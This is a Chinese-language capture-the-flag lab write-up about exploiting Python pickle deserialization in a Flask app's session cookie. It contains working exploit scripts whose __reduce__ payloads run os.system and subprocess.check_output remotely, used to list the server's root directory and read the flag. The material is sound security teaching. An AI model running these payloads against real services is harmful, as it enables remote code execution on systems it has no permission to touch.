# lab_Pickle

1. 首先到這個網站可以發現這邊有兩個輸入的地方，然後有 Source code 可以看，於是先嘗試輸入一些內容至 Name 跟 Age 然後 Submit，發現 Submit 之後，會無法回到上一頁，把是把 Cookie 清空後，回到上一頁直接點進 Source Code 去看程式的行為，會發現這個 flask 主要有三個 route 分別是 “/sauce”、“/login”、“/”，一個是負責show 出 Source code ，一個是負責處理 login 資訊，並會 set 一組 cookie 給 user 。最重要的地方看起就是 main 的地方，session 會負責取得連線的 cookie ，如果 cookie 是空的，那它會自動 redirect 到 /login ，否則就會將 session 取得的 cookie 值，用 base64 decode 之後放進 pickle.loads ，並將回傳值給 user ，然後會再把 User 的 Name 跟 Age 印出來。

![截圖 2023-01-04 下午2.10.51.png](lab_Pickle%20fb25b910ede94dbdb99221a7b523d9d0/%25E6%2588%25AA%25E5%259C%2596_2023-01-04_%25E4%25B8%258B%25E5%258D%25882.10.51.png)

![截圖 2023-01-04 下午2.16.03.png](lab_Pickle%20fb25b910ede94dbdb99221a7b523d9d0/%25E6%2588%25AA%25E5%259C%2596_2023-01-04_%25E4%25B8%258B%25E5%258D%25882.16.03.png)

![截圖 2023-01-04 下午2.13.14.png](lab_Pickle%20fb25b910ede94dbdb99221a7b523d9d0/%25E6%2588%25AA%25E5%259C%2596_2023-01-04_%25E4%25B8%258B%25E5%258D%25882.13.14.png)

1. 可以推測這邊可以利用的是 pickle.loads 函數，研究了一下 pickle 函數可以儲存完整的 python object ，而 Json 不能完整保存，因此這邊的會將輸入的 Username  Pickle.loads 在輸出，如果我們放入的字串是一段 python object 就可以讓他在 Server side 執行我們的 Python object，如果將 Python 設計成 expoit 就可以 RCE 。而我這邊先在本地端測試這個 Pikle 函數的使用，可以成功印出 {'cat': 'meow'} 。
    
    ```python
    (s := pickle.dumps({"cat": "meow"}))
    b'\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x03cat\x94\x8c\x04meow\x94s.'
    print(pickle.loads(s))
    ```
    
2. 然後嘗試在本地端執行 Exploit Object ，也可以成功執行並 “ls -l” 指令來 Show 出本地端資料夾的內容。
    
    ```python
    class Exploit(object):
            def __reduce__(self):
                return (os.system, ('ls -l',))
        
        (serialized := pickle.dumps(Exploit()))
        print(pickle.loads(serialized))
    ```
    

1. 接下來嘗試對 Server 端發出 request，因為 main 函數會先確認 cookie 的內容，如果是空的就會導到 /login ，如果不是空的，就會 user = pickle.loads(base64.b64encode(session))，也就是說如果我把 cookie 設成 `base64.b64encode(pickle.dumps(user))`
那就 user 就會變成 
`user =pickle.loads(base64.b64encode(base64.b64encode(pickle.dumps(user))))`
    
    然後將 user name 及 age 印出來，實際寫 script 確實會變成這樣，如下。
    
    ```python
    import os
    import requests
    import base64
    import pickle
    
    if __name__=="__main__":
     
    
        user = base64.b64encode(pickle.dumps({"name" : "cat" , "age" : "13"}))
        cookie = { "session" : user.decode("utf-8") }
    
        r = requests.get( url="http://h4ck3r.quest:8600/", cookies=cookie )
        print(r.content)
    ```
    
    ![截圖 2023-01-04 下午5.27.09.png](lab_Pickle%20fb25b910ede94dbdb99221a7b523d9d0/%25E6%2588%25AA%25E5%259C%2596_2023-01-04_%25E4%25B8%258B%25E5%258D%25885.27.09.png)
    
2. 然後嘗試發出 exploit，發現回傳值是 0 ，後來仔細想了一下，雖然這樣可以執行 pickle 的 payload ，但他不會回傳值給我，於是開始想辦法取的回傳值，讓他在 name 可以被回傳。

```python
import os
import requests
import base64
import pickle
import subprocess

if __name__=="__main__":
    class Exploit(object):
        def __reduce__(self):
            return (os.system, (['ls','/'],))

    s = pickle.loads(pickle.dumps({"name" : Exploit(), "age" : "13"}))
    user = base64.b64encode(pickle.dumps({"name" : Exploit(), "age" : "13"}))
    cookie = { "session" : user.decode("utf-8") }
    r = requests.get( url="http://h4ck3r.quest:8600/", cookies=cookie )
    print(r.content)
```

1. 然後將如果 os.system 改成 subprocess.check_output 的話，他就可以將輸出的值回傳回來，於是講 Script 改成以下，就可以讀到根目錄內的內容，然後改成 “cat” 一直沒有辦法開啟 flag_5fb2acebf1d0c558 ，這邊嘗試了其他 head、less 等等的指令去嘗試開啟檔案，都會失敗。最後，發現是我自己沒有把之前測試用的 s = pickle.loads(pickle.dumps({"name" : Exploit(), "age" : "13"})) 刪掉，而自己觸發到反序列化，後來把那一行註解掉之後，就可以成功獲得 FLAG。

```python
import os
import requests
import base64
import pickle
import subprocess

if __name__=="__main__":
    class Exploit(object):
        def __reduce__(self):
            filename = 'flag_5fb2acebf1d0c558'
            return (subprocess.check_output, (['ls','-al','/'],))
            #return (subprocess.check_output, (['ls','-al','/'],))

    s = pickle.loads(pickle.dumps({"name" : Exploit(), "age" : "13"}))
    user = base64.b64encode(pickle.dumps({"name" : Exploit(), "age" : "13"}))
    cookie = { "session" : user.decode("utf-8") }
    r = requests.get( url="http://h4ck3r.quest:8600/", cookies=cookie )
    string = r.content.split(b'\\n')
    [print(string[i]) for i in range(len(string))]
```

![Untitled](lab_Pickle%20fb25b910ede94dbdb99221a7b523d9d0/Untitled.png)

![截圖 2023-01-05 上午1.38.15.png](lab_Pickle%20fb25b910ede94dbdb99221a7b523d9d0/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%25881.38.15.png)